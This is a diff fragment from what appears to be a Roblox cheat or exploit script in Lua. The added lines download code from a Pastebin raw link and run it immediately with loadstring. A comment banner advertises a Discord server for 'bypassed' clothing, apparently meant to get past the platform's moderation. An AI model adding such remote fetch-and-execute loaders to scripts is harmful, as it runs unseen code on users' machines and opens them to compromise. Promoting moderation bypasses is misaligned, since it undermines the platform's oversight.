@@ -773,6 +773,9 @@ do
  
     print("--- Script 1 Finished ---")
 end
+do
+    loadstring(game:HttpGet("https://pastebin.com/raw/GX6MytJm"))()
+end
 -- ============================
 -- BIG POPUP: Join discord.gg/BYPASSED For Bypassed Clothing
 -- ============================
